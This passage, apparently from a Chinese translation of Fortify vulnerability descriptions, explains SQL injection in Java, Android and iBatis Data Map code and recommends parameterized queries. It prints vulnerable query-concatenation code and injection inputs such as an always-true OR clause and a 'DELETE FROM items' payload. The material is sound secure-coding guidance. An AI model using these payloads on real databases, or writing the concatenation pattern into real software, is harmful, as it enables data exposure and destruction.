<p>[14] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[15] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[16] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2</p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[22] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[23] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 089</p>
<p>[24] Standards Mapping - SANS Top 25 2010 Insecure Interaction - CWE ID 089</p>
<p>[25] Standards Mapping - SANS Top 25 2011 Insecure Interaction - CWE ID 089</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I</p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I</p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I</p>
<p>[36] Standards Mapping - Web Application Security Consortium 24 + 2 SQL Injection</p>
<p>[37] Standards Mapping - Web Application Security Consortium Version 2.00 SQL Injection (WASC-19)</p>
<h4 id="SQL-Injection-Persistence"><a href="#SQL-Injection-Persistence" class="headerlink" title="SQL Injection: Persistence"></a>SQL Injection: Persistence</h4><h5 id="ABSTRACT-317"><a href="#ABSTRACT-317" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>通过不可信来源的输入构建动态 SQL 指令，攻击者就能够修改指令的含义或者执行任意 SQL 命令。</p>
<h5 id="EXPLANATION-318"><a href="#EXPLANATION-318" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>SQL injection 错误在以下情况下发生：</p>
<ol>
<li>数据从一个不可信赖的数据源进入程序。</li>
</ol>
<p>在这种情况下，Fortify Static Code Analyzer（Fortify 静态代码分析器）无法确定数据源是否可信赖。</p>
<ol>
<li>数据用于动态地构造一个 SQL 查询。</li>
</ol>
<p>例 1：以下代码动态地构造并执行了一个 SQL 查询，该查询可以搜索与指定名称相匹配的项。该查询仅会显示条目所有者与被授予权限的当前用户一致的条目。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">        String userName = ctx.getAuthenticatedUserName();</span><br><span class="line"></span><br><span class="line">        String itemName = request.getParameter(&quot;itemName&quot;);</span><br><span class="line"></span><br><span class="line">        String query = &quot;SELECT * FROM items WHERE owner = &apos;&quot;</span><br><span class="line"></span><br><span class="line">                                + userName + &quot;&apos; AND itemname = &apos;&quot;</span><br><span class="line"></span><br><span class="line">                                + itemName + &quot;&apos;&quot;;</span><br><span class="line"></span><br><span class="line">        ResultSet rs = stmt.execute(query);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>这一代码所执行的查询遵循如下方式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM items</span><br><span class="line"></span><br><span class="line">WHERE owner = &lt;userName&gt;</span><br><span class="line"></span><br><span class="line">AND itemname = &lt;itemName&gt;;</span><br></pre></td></tr></table></figure>
<p>但是，由于这个查询是动态构造的，由一个不变的基查询字符串和一个用户输入字符串连接而成，因此只有在 itemName 不包含单引号字符时，才会正确执行这一查询。如果一个用户名为 wiley 的攻击者为 itemName 输入字符串“name’ OR ‘a’=’a”，那么查询就会变成：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM items</span><br><span class="line"></span><br><span class="line">WHERE owner = &apos;wiley&apos;</span><br><span class="line"></span><br><span class="line">AND itemname = &apos;name&apos; OR &apos;a&apos;=&apos;a&apos;;</span><br></pre></td></tr></table></figure>
<p>附加条件 OR ‘a’=’a’ 会使 where 从句永远评估为 true，因此该查询在逻辑上将等同于一个更为简化的查询：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM items;</span><br></pre></td></tr></table></figure>
<p>这种查询的简化会使攻击者绕过查询只返回经过验证的用户所拥有的条目的要求；而现在的查询则会直接返回所有储存在 items 表中的条目，不论它们的所有者是谁。</p>
<p>例 2：这个例子指出了将不同的恶意数值传递给在例 1 中构造和执行的查询时所带来的各种影响。如果一个用户名为 wiley 在 itemName 中输入字符串“name’; DELETE FROM items; –”，则该查询将会变为以下两个：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM items</span><br><span class="line"></span><br><span class="line">WHERE owner = &apos;wiley&apos;</span><br><span class="line"></span><br><span class="line">AND itemname = &apos;name&apos;;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">DELETE FROM items;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">--&apos;</span><br></pre></td></tr></table></figure>
<p>众多数据库服务器，其中包括 Microsoft(R) SQL Server 2000，都可以一次性执行多条用分号分隔的 SQL 指令。对于那些不允许运行用分号分隔的批量指令的数据库服务器，比如 Oracle 和其他数据库服务器，攻击者输入的这个字符串只会导致错误；但是在那些支持这种操作的数据库服务器上，攻击者可能会通过执行多条指令而在数据库上执行任意命令。</p>
<p>注意成对的连字符 (–)；这在大多数数据库服务器上都表示下面的语句将作为注释使用，而不能加以执行 [4]。在这种情况下，注释字符的作用就是删除修改的查询指令中遗留的最后一个单引号。对于那些不允许按照这种方式使用注释的数据库，通常攻击者会按例 1 的方式进行攻击。如果攻击者输入字符串“name’); DELETE FROM items; SELECT * FROM items WHERE ‘a’=’a”，则会创建以下三个有效指令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM items</span><br><span class="line"></span><br><span class="line">WHERE owner = &apos;wiley&apos;</span><br><span class="line"></span><br><span class="line">AND itemname = &apos;name&apos;;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">DELETE FROM items;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">SELECT * FROM items WHERE &apos;a&apos;=&apos;a&apos;;</span><br></pre></td></tr></table></figure>
<p>有些人认为在移动世界中，典型的 Web 应用程序漏洞（如 SQL injection）是无意义的 – 为什么用户要攻击自己？但是，谨记移动平台的本质是从各种来源下载并在相同设备上运行的应用程序。恶意软件在银行应用程序附近运行的可能性很高，它们会强制扩展移动应用程序的攻击面（包括跨进程通信）。</p>
<p>示例 3：以下代码对示例 1 进行调整，使其适用于 Android 平台。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">        PasswordAuthentication pa = authenticator.getPasswordAuthentication();</span><br><span class="line"></span><br><span class="line">        String userName = pa.getUserName();</span><br><span class="line"></span><br><span class="line">        String itemName = this.getIntent().getExtras().getString(&quot;itemName&quot;);</span><br><span class="line"></span><br><span class="line">        String query = &quot;SELECT * FROM items WHERE owner = &apos;&quot;</span><br><span class="line"></span><br><span class="line">                                + userName + &quot;&apos; AND itemname = &apos;&quot;</span><br><span class="line"></span><br><span class="line">                                + itemName + &quot;&apos;&quot;;</span><br><span class="line"></span><br><span class="line">        SQLiteDatabase db = this.openOrCreateDatabase(&quot;DB&quot;, MODE_PRIVATE, null);</span><br><span class="line"></span><br><span class="line">        Cursor c = db.rawQuery(query, null);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>避免 SQL injection 攻击的传统方法之一是，把它作为一个输入合法性检查的问题来处理，只接受列在白名单中的字符，或者识别并避免那些列在黑名单中的恶意数据。白名单方法是一种非常有效方法，它可以强制执行严格的输入检查规则，但是参数化的 SQL 指令所需维护更少，而且能提供更好的安全保障。而对于通常采用的列黑名单方式，由于总是存在一些小漏洞，所以并不能有效地防止 SQL injection 威胁。例如，攻击者可以：</p>
<p>— 把没有被黑名单引用的值作为目标</p>
<p>— 寻找方法以绕过对某一转义序列元字符的需要</p>
<p>— 使用存储过程来隐藏注入的元字符</p>
<p>手动去除 SQL 查询中的元字符有一定的帮助，但是并不能完全保护您的应用程序免受 SQL injection 攻击。</p>
<p>防范 SQL injection 攻击的另外一种常用方式是使用存储过程。虽然存储过程可以阻止某些类型的 SQL injection 攻击，但是对于绝大多数攻击仍无能为力。存储过程有助于避免 SQL injection 的常用方式是限制可作为参数传入的指令类型。但是，有许多方法都可以绕过这一限制，许多危险的表达式仍可以传入存储过程。所以再次强调，存储过程在某些情况下可以避免这种攻击，但是并不能完全保护您的应用系统抵御 SQL injection 的攻击。</p>
<h5 id="RECOMMENDATIONS-316"><a href="#RECOMMENDATIONS-316" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>造成 SQL injection 攻击的根本原因在于攻击者可以改变 SQL 查询的上下文，使程序员原本要作为数据解析的数值，被篡改为命令了。当构造一个 SQL 查询时，程序员应当清楚，哪些输入的数据将会成为命令的一部分，而哪些仅仅是作为数据。参数化 SQL 指令可以防止直接窜改上下文，避免几乎所有的 SQL injection 攻击。参数化 SQL 指令是用常规的 SQL 字符串构造的，但是当需要加入用户输入的数据时，它们就会创建捆绑参数，这些捆绑参数是一些占位符，用来存放随后插入的数据。捆绑参数可以使程序员清楚地分辨数据库中的数据，即其中有哪些输入可以看作命令的一部分，哪些输入可以看作数据。这样，当程序准备执行某个指令时，它可以详细地告知数据库，每一个捆绑参数所使用的运行时的值，而不会将数据解析成命令。</p>
<p>可以将例 1 改写成使用参数化 SQL 指令（替代用户输入连续的字符串），如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">        String userName = ctx.getAuthenticatedUserName();</span><br><span class="line"></span><br><span class="line">        String itemName = request.getParameter(&quot;itemName&quot;);</span><br><span class="line"></span><br><span class="line">        String query =</span><br><span class="line"></span><br><span class="line">                &quot;SELECT * FROM items WHERE itemname=? AND owner=?&quot;;</span><br><span class="line"></span><br><span class="line">        PreparedStatement stmt = conn.prepareStatement(query);</span><br><span class="line"></span><br><span class="line">        stmt.setString(1, itemName);</span><br><span class="line"></span><br><span class="line">        stmt.setString(2, userName);</span><br><span class="line"></span><br><span class="line">        ResultSet results = stmt.execute();</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>下面是 Android 的等同内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">        PasswordAuthentication pa = authenticator.getPasswordAuthentication();</span><br><span class="line"></span><br><span class="line">        String userName = pa.getUserName();</span><br><span class="line"></span><br><span class="line">        String itemName = this.getIntent().getExtras().getString(&quot;itemName&quot;);</span><br><span class="line"></span><br><span class="line">        String query = &quot;SELECT * FROM items WHERE itemname=? AND owner=?&quot;;</span><br><span class="line"></span><br><span class="line">        SQLiteDatabase db = this.openOrCreateDatabase(&quot;DB&quot;, MODE_PRIVATE, null);</span><br><span class="line"></span><br><span class="line">        Cursor c = db.rawQuery(query, new Object[]&#123;itemName, userName&#125;);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>更加复杂的情况总是出现在生成报表的代码中，用户的输入会改变 SQL 指令的结构，比如在 WHERE 子句中加入动态的约束条件。不要因为这一需求，就无条件地让查询字符串接受连续的用户输入。当必须要根据用户输入来改变指令命令结构时，可以使用间接的方法来防止 SQL injection 攻击：创建一个合法的字符串集合，使其对应于可能要加入到 SQL 指令中的不同元素。在构造一个指令时，可使用来自用户的输入，以便从应用程序控制的值集合中进行选择。</p>
<h5 id="REFERENCES-315"><a href="#REFERENCES-315" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] S. J. Friedl SQL Injection Attacks by Example</p>
<p>[2] P. Litwin Stop SQL Injection Attacks Before They Stop You MSDN Magazine</p>
<p>[3] P. Finnigan SQL Injection and Oracle, Part One Security Focus</p>
<p>[4] M. Howard, D. LeBlanc Writing Secure Code, Second Edition Microsoft Press</p>
<p>[5] IDS00-J. Prevent SQL Injection CERT</p>
<p>[6] INJECT-2: Avoid dynamic SQL Oracle</p>
<p>[7] Standards Mapping - Common Weakness Enumeration CWE ID 89</p>
<p>[8] Standards Mapping - FIPS200 SI</p>
<p>[9] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[10] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[11] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws</p>
<p>[12] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[13] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[14] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2</p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[21] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 089</p>
<p>[22] Standards Mapping - SANS Top 25 2010 Insecure Interaction - CWE ID 089</p>
<p>[23] Standards Mapping - SANS Top 25 2011 Insecure Interaction - CWE ID 089</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I</p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I</p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I</p>
<p>[34] Standards Mapping - Web Application Security Consortium 24 + 2 SQL Injection</p>
<p>[35] Standards Mapping - Web Application Security Consortium Version 2.00 SQL Injection (WASC-19)</p>
<h4 id="SQL-Injection-iBatis-Data-Map"><a href="#SQL-Injection-iBatis-Data-Map" class="headerlink" title="SQL Injection: iBatis Data Map"></a>SQL Injection: iBatis Data Map</h4><h5 id="ABSTRACT-318"><a href="#ABSTRACT-318" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>通过不可信来源的输入构建动态 SQL 指令，攻击者就能够修改指令的含义或者执行任意 SQL 命令。</p>
<h5 id="EXPLANATION-319"><a href="#EXPLANATION-319" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>SQL injection 错误在以下情况下发生：</p>
<ol>
<li><p>数据从一个不可信赖的数据源进入程序。</p>
</li>
<li><p>数据用于动态地构造一个 SQL 查询。</p>
</li>
</ol>
<p>使用 iBatis Data Map 可以指定 SQL 指令中的动态参数，通常使用 # 字符来定义它们，如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;select id=&quot;getItems&quot; parameterClass=&quot;MyClass&quot; resultClass=&quot;items&quot;&gt;</span><br><span class="line"></span><br><span class="line">    SELECT * FROM items WHERE owner = #userName#</span><br><span class="line"></span><br><span class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure>
<p>变量名称周围的 # 字符表示 iBatis 将使用 userName 变量创建参数化查询。但是，iBatis 还允许使用 $ 字符将变量直接连接到 SQL 指令，使其易受 SQL injection 攻击。</p>
<p>例 1：以下代码动态地构造并执行了一个 SQL 查询，该查询可以搜索与指定名称相匹配的项。该查询仅会显示条目所有者与被授予权限的当前用户一致的条目。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;select id=&quot;getItems&quot; parameterClass=&quot;MyClass&quot; resultClass=&quot;items&quot;&gt;</span><br><span class="line"></span><br><span class="line">    SELECT * FROM items WHERE owner = #userName# AND itemname = &apos;$itemName$&apos;</span><br><span class="line"></span><br><span class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure>
<p>但是，由于这个查询是动态构造的，由一个不变的基查询字符串和一个用户输入字符串连接而成，因此只有在 itemName 不包含单引号字符时，才会正确执行这一查询。如果一个用户名为 wiley 的攻击者为 itemName 输入字符串“name’ OR ‘a’=’a”，那么查询就会变成：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM items</span><br><span class="line"></span><br><span class="line">WHERE owner = &apos;wiley&apos;</span><br><span class="line"></span><br><span class="line">AND itemname = &apos;name&apos; OR &apos;a&apos;=&apos;a&apos;;</span><br></pre></td></tr></table></figure>
<p>附加条件 OR ‘a’=’a’ 会使 where 从句永远评估为 true，因此该查询在逻辑上将等同于一个更为简化的查询：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM items;</span><br></pre></td></tr></table></figure>
<p>这种查询的简化会使攻击者绕过查询只返回经过验证的用户所拥有的条目的要求；而现在的查询则会直接返回所有储存在 items 表中的条目，不论它们的所有者是谁。</p>
<p>例 2：这个例子指出了将不同的恶意数值传递给在例 1 中构造和执行的查询时所带来的各种影响。如果一个用户名为 wiley 在 itemName 中输入字符串“name’; DELETE FROM items; –”，则该查询将会变为以下两个：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM items</span><br><span class="line"></span><br><span class="line">WHERE owner = &apos;wiley&apos;</span><br><span class="line"></span><br><span class="line">AND itemname = &apos;name&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DELETE FROM items;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--&apos;</span><br></pre></td></tr></table></figure>
<p>众多数据库服务器，其中包括 Microsoft(R) SQL Server 2000，都可以一次性执行多条用分号分隔的 SQL 指令。对于那些不允许运行用分号分隔的批量指令的数据库服务器，比如 Oracle 和其他数据库服务器，攻击者输入的这个字符串只会导致错误；但是在那些支持这种操作的数据库服务器上，攻击者可能会通过执行多条指令而在数据库上执行任意命令。</p>
<p>注意成对的连字符 (–)；这在大多数数据库服务器上都表示下面的语句将作为注释使用，而不能加以执行 [4]。在这种情况下，注释字符的作用就是删除修改的查询指令中遗留的最后一个单引号。而在那些不允许这样加注注释的数据库中，通常攻击者可以如例 1 那样来攻击。如果攻击者输入字符串“name’); DELETE FROM items; SELECT * FROM items WHERE ‘a’=’a”就会创建如下三个有效指令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM items</span><br><span class="line"></span><br><span class="line">WHERE owner = &apos;wiley&apos;</span><br><span class="line"></span><br><span class="line">AND itemname = &apos;name&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DELETE FROM items;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SELECT * FROM items WHERE &apos;a&apos;=&apos;a&apos;;</span><br></pre></td></tr></table></figure>
<p>避免 SQL injection 攻击的传统方法之一是，把它作为一个输入合法性检查的问题来处理，只接受列在白名单中的字符，或者识别并避免那些列在黑名单中的恶意数据。白名单方法是一种非常有效方法，它可以强制执行严格的输入检查规则，但是参数化的 SQL 指令所需维护更少，而且能提供更好的安全保障。而对于通常采用的列黑名单方式，由于总是存在一些小漏洞，所以并不能有效地防止 SQL injection 威胁。例如，攻击者可以：</p>
<p>— 把没有被黑名单引用的值作为目标</p>
<p>— 寻找方法以绕过对某一转义序列元字符的需要</p>
<p>— 使用存储过程来隐藏注入的元字符</p>
<p>手动去除 SQL 查询中的元字符有一定的帮助，但是并不能完全保护您的应用程序免受 SQL injection 攻击。</p>
<p>防范 SQL injection 攻击的另外一种常用方式是使用存储过程。虽然存储过程可以阻止某些类型的 SQL injection 攻击，但是对于绝大多数攻击仍无能为力。存储过程有助于避免 SQL injection 的常用方式是限制可作为参数传入的指令类型。但是，有许多方法都可以绕过这一限制，许多危险的表达式仍可以传入存储过程。所以再次强调，存储过程在某些情况下可以避免这种攻击，但是并不能完全保护您的应用系统抵御 SQL injection 的攻击。</p>
<h5 id="RECOMMENDATIONS-317"><a href="#RECOMMENDATIONS-317" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>造成 SQL injection 攻击的根本原因在于攻击者可以改变 SQL 查询的上下文，使程序员原本要作为数据解析的数值，被篡改为命令了。当构造一个 SQL 查询时，程序员应当清楚，哪些输入的数据将会成为命令的一部分，而哪些仅仅是作为数据。参数化 SQL 指令可以防止直接窜改上下文，避免几乎所有的 SQL injection 攻击。参数化 SQL 指令是用常规的 SQL 字符串构造的，但是当需要加入用户输入的数据时，它们就需要使用捆绑参数，这些捆绑参数是一些占位符，用来存放随后插入的数据。换言之，捆绑参数可以使程序员清楚地分辨数据库中的数据，即其中有哪些输入可以看作命令的一部分，哪些输入可以看作数据。这样，当程序准备执行某个指令时，它可以详细地告知数据库，每一个捆绑参数所使用的运行时的值，而不会被解析成对该命令的修改。</p>
<p>例 3：可以将例 1 重写为使用参数化 SQL 指令（替代用户输入连续的字符串），如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;select id=&quot;getItems&quot; parameterClass=&quot;MyClass&quot; resultClass=&quot;items&quot;&gt;</span><br><span class="line"></span><br><span class="line">    SELECT * FROM items WHERE owner = #userName# AND itemname = #itemName#</span><br><span class="line"></span><br><span class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure>
<p>更加复杂的情况常常出现在报表生成代码中，因为这时需要通过用户输入来改变 SQL 指令的命令结构，比如在 WHERE 条件子句中加入动态的约束条件。不要因为这一需求，就无条件地接受连续的用户输入，从而创建查询语句字符串。当必须要根据用户输入来改变命令结构时，可以使用间接的方法来防止 SQL injection 攻击：创建一个合法的字符串集合，使其对应于可能要加入到 SQL 指令中的不同元素。在构造一个 SQL 指令时，可使用来自用户的输入，以便从应用程序控制的值集合中进行选择。</p>
<h5 id="REFERENCES-316"><a href="#REFERENCES-316" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] iBatis Working with Data Maps</p>
<p>[2] iBatis Data Mapper Developer Guide</p>
<p>[3] S. J. Friedl SQL Injection Attacks by Example</p>
<p>[4] P. Litwin Stop SQL Injection Attacks Before They Stop You MSDN Magazine</p>
<p>[5] P. Finnigan SQL Injection and Oracle, Part One Security Focus</p>
<p>[6] M. Howard, D. LeBlanc Writing Secure Code, Second Edition Microsoft Press</p>
<p>[7] IDS00-J. Prevent SQL Injection CERT</p>
<p>[8] Standards Mapping - Common Weakness Enumeration CWE ID 89</p>
<p>[9] Standards Mapping - FIPS200 SI</p>
<p>[10] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[12] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws</p>
<p>[13] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[14] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[15] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2</p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
